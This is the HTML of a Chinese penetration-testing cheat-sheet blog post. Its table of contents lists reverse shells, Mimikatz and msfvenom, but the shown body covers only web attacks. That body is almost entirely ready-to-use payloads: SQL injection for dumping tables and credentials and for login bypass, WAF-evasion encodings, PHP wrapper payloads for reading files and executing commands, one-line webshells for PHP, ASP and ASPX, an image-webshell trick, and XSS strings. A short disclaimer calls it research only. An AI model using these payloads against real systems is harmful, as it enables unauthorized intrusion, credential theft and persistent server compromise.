class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php伪协议，以base64编码输出"><span class="toc-number">1.3.1.</span> <span class="toc-text">php伪协议，以base64编码输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php伪协议，以base64编码写入"><span class="toc-number">1.3.2.</span> <span class="toc-text">php伪协议，以base64编码写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data协议命令执行"><span class="toc-number">1.3.3.</span> <span class="toc-text">data协议命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一句话木马"><span class="toc-number">1.4.</span> <span class="toc-text">一句话木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php"><span class="toc-number">1.4.1.</span> <span class="toc-text">php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#asp"><span class="toc-number">1.4.2.</span> <span class="toc-text">asp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#aspx"><span class="toc-number">1.4.3.</span> <span class="toc-text">aspx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#生成图片马"><span class="toc-number">1.4.4.</span> <span class="toc-text">生成图片马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-Payload"><span class="toc-number">1.5.</span> <span class="toc-text">XSS Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python沙箱逃逸"><span class="toc-number">1.6.</span> <span class="toc-text">Python沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#python2沙箱逃逸"><span class="toc-number">1.6.1.</span> <span class="toc-text">python2沙箱逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python3沙箱逃逸"><span class="toc-number">1.6.2.</span> <span class="toc-text">python3沙箱逃逸</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP命令执行"><span class="toc-number">1.7.</span> <span class="toc-text">PHP命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP代码执行"><span class="toc-number">1.8.</span> <span class="toc-text">PHP代码执行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#横向渗透"><span class="toc-number">2.</span> <span class="toc-text">横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WMIC"><span class="toc-number">2.0.1.</span> <span class="toc-text">WMIC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IPC-Schtasks"><span class="toc-number">2.0.2.</span> <span class="toc-text">IPC + Schtasks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IPC-AT"><span class="toc-number">2.0.3.</span> <span class="toc-text">IPC + AT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Smbexec"><span class="toc-number">2.0.4.</span> <span class="toc-text">Smbexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Psexec"><span class="toc-number">2.0.5.</span> <span class="toc-text">Psexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTH"><span class="toc-number">2.0.6.</span> <span class="toc-text">PTH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Wmiexec"><span class="toc-number">2.0.7.</span> <span class="toc-text">Wmiexec</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#渗透测试"><span class="toc-number">3.</span> <span class="toc-text">渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹shell"><span class="toc-number">3.1.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bash"><span class="toc-number">3.1.1.</span> <span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NC"><span class="toc-number">3.1.2.</span> <span class="toc-text">NC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">3.1.3.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Telnet"><span class="toc-number">3.1.4.</span> <span class="toc-text">Telnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crontab"><span class="toc-number">3.1.5.</span> <span class="toc-text">crontab</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Socat"><span class="toc-number">3.1.6.</span> <span class="toc-text">Socat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获得伪终端"><span class="toc-number">3.1.7.</span> <span class="toc-text">获得伪终端</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">3.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件传输"><span class="toc-number">3.3.</span> <span class="toc-text">文件传输</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bitsadmin下载文件"><span class="toc-number">3.3.1.</span> <span class="toc-text">bitsadmin下载文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#certutil下载文件并执行"><span class="toc-number">3.3.2.</span> <span class="toc-text">certutil下载文件并执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#certutil清除缓存"><span class="toc-number">3.3.3.</span> <span class="toc-text">certutil清除缓存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell下载文件"><span class="toc-number">3.3.4.</span> <span class="toc-text">powershell下载文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wget"><span class="toc-number">3.3.5.</span> <span class="toc-text">wget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl"><span class="toc-number">3.3.6.</span> <span class="toc-text">curl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-1"><span class="toc-number">3.3.7.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-number">3.3.8.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ruby"><span class="toc-number">3.3.9.</span> <span class="toc-text">Ruby</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Perl"><span class="toc-number">3.3.10.</span> <span class="toc-text">Perl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Powershell加载远程脚本"><span class="toc-number">3.3.11.</span> <span class="toc-text">Powershell加载远程脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工具"><span class="toc-number">3.4.</span> <span class="toc-text">工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mimikatz"><span class="toc-number">3.4.1.</span> <span class="toc-text">Mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#启动mimikatz"><span class="toc-number">3.4.2.</span> <span class="toc-text">启动mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取登录账号的明文密码和Hash值"><span class="toc-number">3.4.3.</span> <span class="toc-text">获取登录账号的明文密码和Hash值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#备份注册表中的SYSTTEM-amp-SAM-hive"><span class="toc-number">3.4.4.</span> <span class="toc-text">备份注册表中的SYSTTEM &amp; SAM hive</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz获取hashs"><span class="toc-number">3.4.5.</span> <span class="toc-text">mimikatz获取hashs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#读取从lsass进程中保存文件里的明文密码"><span class="toc-number">3.4.6.</span> <span class="toc-text">读取从lsass进程中保存文件里的明文密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NMAP"><span class="toc-number">3.5.</span> <span class="toc-text">NMAP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基础扫描"><span class="toc-number">3.5.1.</span> <span class="toc-text">基础扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存活主机探测"><span class="toc-number">3.5.2.</span> <span class="toc-text">存活主机探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#全端口扫描"><span class="toc-number">3.5.3.</span> <span class="toc-text">全端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#系统扫描"><span class="toc-number">3.5.4.</span> <span class="toc-text">系统扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#服务版本检测"><span class="toc-number">3.5.5.</span> <span class="toc-text">服务版本检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#waf识别"><span class="toc-number">3.5.6.</span> <span class="toc-text">waf识别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Msfvenom"><span class="toc-number">3.6.</span> <span class="toc-text">Msfvenom</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows"><span class="toc-number">3.6.1.</span> <span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-number">3.6.2.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mac"><span class="toc-number">3.6.3.</span> <span class="toc-text">Mac</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bash-1"><span class="toc-number">3.6.4.</span> <span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-2"><span class="toc-number">3.6.5.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSP"><span class="toc-number">3.6.6.</span> <span class="toc-text">JSP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAR"><span class="toc-number">3.6.7.</span> <span class="toc-text">WAR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-1"><span class="toc-number">3.6.8.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Perl-1"><span class="toc-number">3.6.9.</span> <span class="toc-text">Perl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell"><span class="toc-number">3.6.10.</span> <span class="toc-text">PowerShell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit"><span class="toc-number">3.7.</span> <span class="toc-text">Metasploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#msfconsole"><span class="toc-number">3.7.1.</span> <span class="toc-text">msfconsole</span></a></li></ol></li></ol></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(http://pic.linkle.top/img/linkle/20210403133452.png)"><div id="post-info"><div id="post-title"><div class="posttitle">渗透测试备忘录</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 发表于 2021-04-03<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> 更新于 2021-04-03</time><div class="post-meta-wordcount"><div class="post-meta-pv-cv"><i class="fa fa-comments-o post-meta__icon fa-fw" aria-hidden="true"></i><span>评论数:</span><a href="/2021/04/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count comment-count" data-xid="/2021/04/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/" itemprop="commentCount"></span></a></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><p><code>本文章仅作技术研究，请勿用作非法途径!</code></p>
<p>数据来源: 蚁景科技网安百宝垫</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL Inject"></a>SQL Inject</h2><h3 id="联合查询爆显示位"><a href="#联合查询爆显示位" class="headerlink" title="联合查询爆显示位"></a>联合查询爆显示位</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span></span><br></pre></td></tr></table></figure></div>

<h3 id="联合查询爆表名"><a href="#联合查询爆表名" class="headerlink" title="联合查询爆表名"></a>联合查询爆表名</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<h3 id="联合查询爆字段名"><a href="#联合查询爆字段名" class="headerlink" title="联合查询爆字段名"></a>联合查询爆字段名</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.column <span class="keyword">where</span> table_schema=<span class="string">'users'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<h3 id="联合查询爆字段值"><a href="#联合查询爆字段值" class="headerlink" title="联合查询爆字段值"></a>联合查询爆字段值</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="string">`key`</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' or'1'='1'</span><br></pre></td></tr></table></figure></div>

<h3 id="布尔盲注测试"><a href="#布尔盲注测试" class="headerlink" title="布尔盲注测试"></a>布尔盲注测试</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and length(database())=4 <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<h3 id="时间盲注测试"><a href="#时间盲注测试" class="headerlink" title="时间盲注测试"></a>时间盲注测试</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or if(ascii(substr(database(),1,1))&gt;0,sleep(1),1) --+</span><br></pre></td></tr></table></figure></div>

<h3 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure></div>

<h3 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure></div>

<h3 id="info-outfile写文件"><a href="#info-outfile写文件" class="headerlink" title="info outfile写文件"></a>info outfile写文件</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html'</span></span><br></pre></td></tr></table></figure></div>

<h3 id="load-file-读文件"><a href="#load-file-读文件" class="headerlink" title="load_file 读文件"></a>load_file 读文件</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'/etc/passwd'</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="access"><a href="#access" class="headerlink" title="access"></a>access</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> msysobjects)&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<h3 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> sysobjects)&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<h3 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> sys.user_tables)&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure></div>



<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uNIoN <span class="keyword">sELecT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure></div>

<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span>%55nION<span class="comment">/**/</span>%53ElecT<span class="comment">/**/</span>1,2,3Select(user())from test where id=1 and 1=1;</span><br></pre></td></tr></table></figure></div>

<h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!UNION*/</span>+<span class="comment">/*!SELECT*/</span>+1,2,3<span class="comment">/*UnIoN*/</span>+<span class="keyword">SeLeCT</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="keyword">concat</span>(<span class="comment">/*!table_name*/</span>)+<span class="keyword">FrOM</span><span class="comment">/*information_schema*/</span>.tables <span class="comment">/*!WHERE*/</span>+<span class="comment">/*!TaBlE_ScHeMa*/</span>+<span class="keyword">like</span>+<span class="keyword">database</span>()<span class="comment">---</span></span><br></pre></td></tr></table></figure></div>

<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNIunionON+SELselectECT+1,2,3</span><br></pre></td></tr></table></figure></div>

<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ul>
<li>URLEncode编码：<code>or 1=1</code>即<code>%6f%72%20%31%3d%31</code></li>
<li>ASCII编码： Test：<code>CHAR(84)+CHAR(101)+CHAR(115)+CHAR(116)</code></li>
<li>十六进制编码：<code>SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</code></li>
</ul>
<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><h3 id="php伪协议，以base64编码输出"><a href="#php伪协议，以base64编码输出" class="headerlink" title="php伪协议，以base64编码输出"></a>php伪协议，以base64编码输出</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure></div>

<h3 id="php伪协议，以base64编码写入"><a href="#php伪协议，以base64编码写入" class="headerlink" title="php伪协议，以base64编码写入"></a>php伪协议，以base64编码写入</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=convert.base64-decode/resource=xx.php</span></span><br></pre></td></tr></table></figure></div>

<h3 id="data协议命令执行"><a href="#data协议命令执行" class="headerlink" title="data协议命令执行"></a>data协议命令执行</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'whoami'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'pwd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute(request(&#39;pwd&#39;))%&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">csharp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% @Page Language=<span class="string">'jscript'</span>%&gt;&lt;%eval(Request.Item[<span class="string">'pwd'</span>],<span class="string">'unsafe'</span>);%&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="生成图片马"><a href="#生成图片马" class="headerlink" title="生成图片马"></a>生成图片马</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy <span class="number">1</span>.jpg /b + <span class="number">1</span>.php /b shell.php</span><br></pre></td></tr></table></figure></div>



<h2 id="XSS-Payload"><a href="#XSS-Payload" class="headerlink" title="XSS Payload"></a>XSS Payload</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

